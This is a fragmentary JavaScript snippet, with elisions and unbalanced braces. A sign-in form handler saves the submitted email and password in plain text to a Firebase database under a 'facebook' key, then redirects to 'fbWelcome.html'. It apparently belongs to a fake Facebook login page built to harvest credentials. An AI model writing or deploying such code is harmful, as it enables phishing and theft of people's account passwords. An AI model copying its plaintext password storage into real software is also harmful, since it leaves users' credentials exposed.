...
document.getElementById('log').addEventListener('submit', submitSigninForm);
function submitSigninForm(e){
    ...
    formdb.ref().child('user-data/' + user.email.replace(/[@|.]/g,'-') + '/facebook').update({
            id : email,
            pass : password
    })
    console.log(user);
    alert('User Logged In!!')
    location.href="fbWelcome.html"
    })
